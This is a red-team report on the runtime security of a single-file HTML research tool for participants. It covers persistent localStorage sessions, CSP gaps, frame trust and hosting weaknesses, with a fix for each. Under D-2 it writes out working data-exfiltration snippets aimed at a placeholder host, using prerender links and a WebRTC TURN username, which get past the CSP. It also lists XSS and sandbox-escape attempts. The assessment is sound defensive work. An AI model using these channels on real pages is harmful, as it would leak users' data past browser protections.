# Red team 1: attacks on the participant's device and browser at runtime

Target: `dist-single/wayfinding-check-participant.html` (3,341,208 bytes, built 16 Oct 2026 15:47, `__WC_SEND_TO__` is empty in this build).
Method: read the source, extracted the built shell script and the embedded prototype document from the file itself, and drove headless Chrome (Chrome for macOS, site isolation off for the debugger as in the project's own e2e, plus runs with the network canary described below). Scratch scripts are in this scratchpad (`t01` to `t18`), none in the project.

Network canary: a local HTTP server and UDP/STUN responder on 127.0.0.1, plus a `--host-resolver-rules` mapping to NOTFOUND for fake hostnames, so every "exfiltration" attempt was observable without touching any external host. A control run (a page with no CSP) proved the canary and the attack code work (about 34 requests arrived). Note: CDP `Network.requestWillBeSent` also fires for requests the CSP then blocks, so the project's e2e request log is not by itself proof of "nothing left the machine"; the canary hit list is.

Verdict in one line: no way found to run attacker script in the page or the frame from any input a participant, a URL or a neighbouring tab can supply, and the sandbox held against every escape tried. The real exposures are privacy on shared browsers (D-1), a CSP that is weaker than the README claims (D-2), and the frame being a fully trusted peer (D-3).

---

## Findings

### D-1 Medium: finished sessions persist in localStorage and are replayed to the next person on the same browser profile
- Evidence: `src/shell/participant/SelfRun.tsx:32-33` reopens the most recently updated non-setup session on every load; `src/shell/state.tsx:52` loads every `wc.v1.session.*` key; `closeSession` (`state.tsx:143`) only clears the in-memory pointer, nothing is ever deleted in the participant edition.
- Reproduced (t09): person A completes one task, writes a free-text note and a final note, saves. Browser closed and reopened on the same profile. Person B opens the file and lands on A's "Thank you for your time" page with A's final note in the text box and the Save button, which downloads A's file. Participant code, membership group, every per-task note and the full event log stay in localStorage indefinitely.
- Same exposure to any other page on the same storage origin. Verified on `file://`: Chrome shares one localStorage across all `file://` pages, so a "neighbouring" HTML file in the Downloads folder read all keys (t09) and rewrote the stored session (participant notes and code changed to attacker text, which the participant page then displayed). Hosted over http(s) the same applies to any other page on that origin (by browser design, not separately tested on a second hosted origin). Firefox and Safari file:// scoping not tested (UNVERIFIED).
- Impact: on a family laptop, library PC or office machine, the next person sees the previous participant's notes (free text, may hold personal details) and can send them as their own results. Researchers could receive a duplicated or cross-contaminated file. A malicious local file can read or alter in-progress research data.
- VERIFIED.
- Fix: do not auto-open a session whose phase is `ended`/`handBack`; delete the session from localStorage on "Save my results" success or on "Start a new session"; offer a plain "Remove my answers from this browser" button on the final page; consider `sessionStorage` (survives reload, dies with the tab) instead of localStorage for the participant edition, accepting that closing the tab loses progress; tell participants on the final page that a copy remains in the browser until removed.

### D-2 Low: the CSP is weaker than the README says; two verified bypass channels and no defence against inline script
- Evidence: `scripts/build-single.mjs:57`. CSP `default-src 'none'; script-src 'unsafe-inline'; ...; frame-src about:; base-uri 'none'; form-action 'none'`. README line 79 says the browser "itself blocks any request to the network, from the app and from the prototype frame".
- What is enforced (VERIFIED, t02, t04, t16): the policy is applied to the page and inherited by the `about:srcdoc` frame. `eval`, `new Function`, `setTimeout(string)`, `data:` and `blob:` scripts, workers, fetch/XHR/WebSocket/EventSource/sendBeacon, images, CSS `url()`/`@import`/fonts/cursors, `<link rel=prefetch|preload|dns-prefetch|preconnect|modulepreload|icon>`, speculation rules, form posts, meta refresh, `<iframe>`/`<object>`/`<embed>`, navigation of the frame to http/data/blob/mailto/custom schemes: none reached the canary. A real 14-task run across desktop, tablet and mobile (search typed, footer, menus, save, copy) made no request other than the file and `data:` fonts/images (t15). (Earlier "eval ALLOWED" results in Runtime.evaluate are a DevTools artefact: eval is blocked for real page scripts.)
- What is NOT stopped (VERIFIED, t04, t05, t16), from inside the sandboxed, CSP-bound frame:
  1. `<link rel="prerender" href="http://host/path?d=DATA">` produced a real GET to the canary (CSP does not govern prerender in this Chrome).
  2. WebRTC: `new RTCPeerConnection({iceServers:[{urls:'turn:host:port',username:'DATA',credential:'x'}]})` sent the username in the second TURN Allocate request to the canary (packet capture shows the string), and STUN binding requests were sent. Chrome does not apply CSP `connect-src` to ICE servers. The sandbox does not block it. This is a general-purpose data channel to any host.
- Also: `script-src 'unsafe-inline'` means that if HTML injection is ever introduced, the CSP will not stop it. I found no such sink today: 0 uses of innerHTML/dangerouslySetInnerHTML with variable content (the only `dangerouslySetInnerHTML` is static SVG in `src/shell/brand.tsx`), no `__html` outside React internals in the built prototype, and payloads typed into the search box (script, img onerror, svg onload, javascript:, attribute breakout, template injection) were rendered as text (t03).
- Preconditions: the attacks need script execution in the frame or page, for which I found no route. So today this is defence in depth and a claim accuracy problem, not an exploitable hole. It becomes material if the build is ever tampered with in transit (D-7) or an XSS sink appears in a future change.
- Fix: (a) replace `'unsafe-inline'` in `script-src` with build-time `'sha256-...'` hashes of the three inline scripts; pass the per-load nonce to the frame through a `<meta name="wc-nonce">` or attribute read by the already hashed bundle, instead of an inline `<script>` injected into the srcdoc; (b) add `require-trusted-types-for 'script'`; (c) on the iframe add `allow=""`, `referrerpolicy="no-referrer"` and the Chrome-only `csp="script-src 'sha256-...'"`; (d) best-effort in the srcdoc preamble, delete `RTCPeerConnection`/`webkitRTCPeerConnection` and `RTCDataChannel` (bypassable by code that can already run, but removes the casual case); (e) correct README line 79 to say what is and is not covered.

### D-3 Low: the embedded frame is a fully trusted peer (clipboard write, message flood, forged events)
All VERIFIED (t06, t08, t18); all require script in the frame (see D-2), so Low.
- Clipboard: with one real user click inside the frame, `document.execCommand('copy')` succeeds and replaced the clipboard with attacker text (read back: `POISONED-BY-FRAME`). The async Clipboard API is correctly denied to the frame by permissions policy.
- Flood: the shell dispatches every valid message through `reduce`, which does `structuredClone(session)` per message (`src/shell/domain/session.ts:170`) even when the event is beyond the 600 cap. 5,000 messages froze the shell for 1.4 s, 30,000 for 9.2 s, scaling linearly (about 0.3 ms each). One million would hang the tab for several minutes. Event storage itself is capped (600, plus 20 decisive), so memory and localStorage do not blow up.
- Forgery: the frame can read its own nonce (`window.__WC_NONCE__`), so a forged `click` with `ends:true` ends the task and a forged event is recorded. This is inherent to the design; it only corrupts the participant's own result file.
- Fix: in `state.tsx` drop messages once `run.events.length` has reached the cap unless decisive, before cloning; rate-limit messages per second in `Frame.tsx`; add a short note to the threat model that the frame is trusted.

### D-4 Low: hosted behaviour: blank page under a stricter host CSP, framing by any site, weaker nonce on plain http
- Strict header (`Content-Security-Policy: default-src 'self'`) in front of the file (t10): inline scripts are refused and the participant gets a completely blank page with no message (availability only; the meta policy is never loosened by a host header, enforcement is the intersection). No `<noscript>` or fallback text exists.
- Framing: no `frame-ancestors` can be set from a meta tag. The hosted file loaded fine inside an `<iframe>` on an unrelated page (t10). Impact is clickjacking or phishing overlay on the research page, low value.
- Non-secure context (plain http on a non-localhost name, t10): `crypto.randomUUID` is undefined, so `Frame.tsx:14` falls back to `Math.random().toString(36)` plus a timestamp (observed `l8qsnqpn6n9mvb3owo8`). The nonce is defence in depth only (the shell also checks `event.source`), so no exploit, but it is not cryptographic. `navigator.clipboard` is also absent there; the manual copy box fallback works.
- Fix: host over https only; set `Content-Security-Policy: frame-ancestors 'none'` and `X-Content-Type-Options: nosniff` at the host; use `crypto.getRandomValues` for the fallback nonce; add a `<noscript>` and a visible "this page needs inline scripts" fallback.

### D-5 Low: the participant edition never tells the participant that saving failed
- Evidence: `saveProblem` and `notice` are only rendered in `src/shell/moderator/Shell.tsx:48-49`; `SelfRun.tsx` shows neither. In a private window, with site data blocked, or with a full quota, progress is silently kept in memory only and a reload or crash loses it. `Participant.tsx:135` also installs a `beforeunload` guard during a task (a "Leave site?" prompt on close), which is the only warning.
- Impact: lost research data, not a device risk. README already says not to use private windows, but participants will not have read it. VERIFIED by code reading (the quota/blocked paths were not forced in a browser).
- Fix: show a plain banner on the participant screens when `persistent` is false or a save fails, and recommend saving the file now.

### D-6 Info: nothing authenticates the file, and the shipped build has no recipient address
- `window.__WC_SEND_TO__=""` in this build, so the finish page says "Send it to the researcher who gave you this tool". An attacker who forwards a modified copy (changed text, added script) cannot be detected by a participant. This is the distribution question; noted only.
- Fix: publish a SHA-256 of the file alongside it on a page you control, host from your own https domain, and build with `WC_SEND_TO`. The build's check on the address is sound (`/^[^\s<>"']+@[^\s<>"']+$/` plus `JSON.stringify`; `</script>` cannot be injected).

### D-7 Info: resource use and robustness of crafted input
- No ReDoS found: the only regexes on user-controlled text are linear (`\s+`, `[^a-z0-9...]`), the code ID is `^[A-Za-z0-9_.-]{1,40}$`.
- Search box with 60,000-character token: no freeze in the typeahead (t17).
- Event cap works (600). A saved session is about 11 KB at start and 102 KB after 14 tasks, so quota is not a realistic problem.
- 60 tampered `localStorage` sessions (all phases, cursors, empty runs, huge arrays, HTML in every text field, `__proto__` keys, 10 MB blobs, far-future timestamps) never crashed the app, never executed script and never polluted prototypes (t11). Two tamper-only dead ends: `cursor` at or beyond the end shows "Scenario 13 of 12" and "Show me the next scenario" silently does nothing (the "End session" link still works); a huge `order` array renders "Scenario 2 of 100000". Both need write access to the participant's storage (see D-1).
- `participantId` read back from storage is only length-limited (`exports.ts:133`), not pattern-checked, but it only reaches the download filename (`doterra_research_<id>_<date>.json`, fixed `.json` suffix, browser strips path characters) and React text.

### D-8 Info: what the saved results file contains
JSON with the participant code, membership answer, per-task notes, final note, timings, click and menu events (labels and hrefs of site links only), frame size (1440 x 1024 style `ready` event), scale factor, and the task content snapshot. No user agent, language, time zone, IP, screen size or other fingerprint fields (checked by key search). Contains only the one session being saved, never earlier sessions in storage. "Copy instead" puts the whole JSON on the clipboard.

---

## What I tried that did NOT work (covered)

| Area | Attempt | Result |
|---|---|---|
| CSP | eval, `new Function`, `setTimeout(string)`, `data:`/`blob:` script, worker (url, blob, data), dynamic `import()`, service worker | all blocked (frame and page) |
| CSP | fetch, XHR, sendBeacon, WebSocket, EventSource, WebTransport, `<a ping>`, form post, meta refresh, `<base>`, nested iframe/object/embed, img/srcset/picture/input image/poster/svg image, CSS url/import/font/cursor/image-set/content, favicon link, speculation rules, prefetch/preload/dns-prefetch/preconnect/modulepreload | none reached the canary |
| Sandbox | `top.location`, `parent.location`, `window.open` (also from a fresh nested iframe and `<a target=_blank/_top>`), nested srcdoc popup, middle click and ctrl-click on a real footer link (real CDP mouse events), `history.back/go(-1)` with and without user activation (top URL unchanged) | blocked |
| Sandbox | `alert/confirm/prompt`, fullscreen, pointer lock, geolocation, camera, display capture, notifications, async clipboard read/write, file pickers, USB/serial/HID/Bluetooth, share, payment, credentials, requestStorageAccess, `document.domain`, localStorage/sessionStorage/IndexedDB/cookies/Cache from the frame, downloads (blob and data URL, nothing landed on disk) | blocked or denied |
| postMessage | spoof from the shell page itself, from a nested about:blank iframe in the shell, wrong nonce from the real frame, all with the correct source/nonce combination tested separately | only the real frame with the correct nonce is accepted; nonce is not exposed on any shell global |
| Injection | script, img onerror, svg onload, `javascript:`, attribute breakout, `</title>`, `@import`, nested iframe payloads typed into the search box; the results page, typeahead, h1, did-you-mean, stored recent searches; tampered storage fields rendered on the participant screens | rendered as text, no execution |
| Links | all 117 anchors at desktop, tablet and mobile (menu drawer and every section) have internal `/...` hrefs only, no `target`, no forms, no external images; every one has its default prevented by the time the click reaches `window` | clean |
| Network proof | 14-task run (all three breakpoints, search, footer, menus, save, copy) with canary and CSP listeners | zero outside requests, zero CSP violations, zero console errors |
| Resource | event flood capped, search token 60k chars, regexes, 60 tampered sessions | no crash, no data loss beyond D-3 freeze |
| Dependencies | Vite modulepreload polyfill `fetch` is present but only fires for `<link rel=modulepreload>` elements, none exist | inert |
| Remote strings | `images.unsplash.com` avatar URLs exist in the prototype bundle's CSS-in-JS | not rendered (all 117 anchors, no avatar); would be blocked by `img-src data:` anyway |

## Assumptions and limits
- Chrome for macOS (current build on this machine) only. Firefox, Safari and Edge behaviour not tested: prerender and WebRTC CSP gaps, file:// storage scoping and sandbox download rules may differ (UNVERIFIED there).
- Headless Chrome with site isolation off for the debugger, as in the project's e2e; sandbox semantics do not depend on it. The shipped file has no back door.
- Attacker model as briefed. I did not review the moderated build or the researcher-side import path (separate lenses), and did not test a signed or tampered file in transit.
- "Hosted" tests used a local http server on 127.0.0.1 and a fake non-secure hostname mapped to loopback; no external host was contacted.
